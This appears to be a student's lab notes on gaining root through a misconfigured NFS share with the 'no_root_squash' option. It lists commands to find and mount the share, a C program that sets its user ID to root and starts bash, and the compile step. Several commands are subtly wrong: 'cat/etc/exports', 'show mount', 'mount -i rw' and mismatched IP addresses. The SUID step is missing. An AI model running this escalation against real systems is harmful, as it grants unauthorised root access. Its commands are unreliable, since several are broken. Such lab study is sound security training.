NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.

```
cat/etc/exports
```

![](Pasted%20image%2020250704000057.png)

The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

```bash
show mount -e 10.10.123.79
```

make sour to run these command in you system root shell.

![](Pasted%20image%2020250704000255.png)

```bash
mkdir /tmp/tmpdrive       #create dir to mount drive
mount -i rw 10.10.2.12:/backups /tmp/tmpdrive
```

```c
#include <unistd.h>
#include <stdlib.h>
int main()
{
setgid(0);
setuid(0);
system("/bin/bash");
return 0;
}       //we set suid bit that run /bin/bash
```

we compile the file 

![](Pasted%20image%2020250704000631.png)

```
gcc -static file.c -o file
```

now run the file on target system to spawn root shell.

![](Pasted%20image%2020250704003056.png)
